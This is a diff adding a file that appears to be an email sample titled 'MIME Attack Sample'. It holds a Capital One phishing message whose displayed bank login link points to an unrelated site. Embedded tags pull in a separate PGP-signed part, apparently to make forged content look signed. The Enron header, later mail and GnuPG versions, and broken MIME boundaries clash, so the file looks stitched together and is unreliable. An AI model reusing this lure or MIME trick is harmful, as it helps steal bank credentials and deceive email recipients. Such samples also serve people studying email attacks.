@@ -1,0 +1,81 @@
+From: Tana Jones@ECT on 06/19/2000 01:42 PM
+To: tim.belden@enron.com, susan.mara@enron.com, elizabeth.sager@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Content-Length: 1352
+Lines: 23
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 899
+
+<br><br>
+<font face="Verdana" size="2"><table width="67%">
+
+Dear Capital One Bank customer,<br><br>
+
+We recently reviewed your account, and suspect that your Capital One Online Banking account may have been accessed from an unauthorized computer. This may be due to changes in your IP address or location. Protecting the security of your account and of the Capital One Bank network is our primary concern.<br><br>
+
+We are asking you to immediately login and report any unnoticed password changes, unauthorized withdrawals or deposits, and check you account profile to make sure no changes have been made.<br><br>
+
+To protect your account please follow the instructions below:<br><br>
+
+&nbsp;&nbsp;&nbsp;&nbsp;* DO NOT SHARE YOUR PASSWORD WITH OTHER USERS<br><br>
+
+&nbsp;&nbsp;&nbsp;&nbsp;* LOG OFF AFTER USING YOUR ONLINE ACCOUNT<br><br>
+
+Please click the following link, to verify your account activity:<br><br>
+
+<a href="http://www.firstdorridgebrownies.org.uk/.screen/www.capitalone.com/online/profile.php" target="_blank">https://onlinebanking.capitalone.com/capitalone/login.aspx</a><br><br>
+
+We apologize for any inconvenience this may cause, and appreciate your assistance in helping us maintaining the integrity of the entire Capital One Bank system. Please login as soon as possible.<br><br>
+
+Thank you,<br>
+Capital One Bank Security Advisor.
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA512
+
+ 
+- -- 
+Igor
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.7 (GNU/Linux)
+
+iQIVAwUBRmxa2qe2pgKIdGq4AQoHCA//fiMo3WVR6SWuat3UgGdrKDWglshQbSfp
+RYysmExR00Rc5Lp0mnGMH2WNRR3CUzzBc25XZFHPsvxkBLS5PKMINI4BKtlHdR4O
+2qARkT3BeMrv9C56zwGZ4Y82l5DJc0T3kZr/Ml/OiF5q1iP8jKg0yahZqik1Kf9A
+/iFvHMSjSEU14p+BM018npdmcK2AWybw3fT1bD/OzLpChmkIQD3poYkXQwTCdAz2
+c3PRcRYRcaWN2VnbM4ahaantXlTglXe6keY8Ppkgd/wiQXjcDpDQCMVJSuHN5S8b
+IKEK6l5l9HzXoA1lIOKWFcugtz57JlwBJ5CIcZeB54DDX6CKy5KXuaUALzi1VcBF
+Gp68C39hgKIBp5xHDD2tb9mPSzqPAci514fcFX8Do3iPJk2OFl689leWuZ8Pfyc2
+I3//VlRdRGOoPo9HXq6VKwbw0HhIxNNc/7BWAcC3uy5mdcP70ftKnhVA7D6mVKr5
+2QNkhIqLf5tk/WfyQ/7p5ubyaqpahX/IMEEfwZhx+N1cm8Foze4OFrz8+HUWdpm+
+sMRbfIkvSdN9JNsw6RnmdSqcKXPZ+gzqW+PsLvsrgG4FcUacVLQgd+anfd4jYs+e
+y38z1BQ9IdKUyYJfqSp+NLYO+uybcfiE/gjbxr6fOkE/RChHmy0DzRx+UqWPCBH3
+2GsFvl51ddw=
+=er7k
+-----END PGP SIGNATURE-----
+
+-- 
+
+--BOUNDARY--
+--DELIMITER--
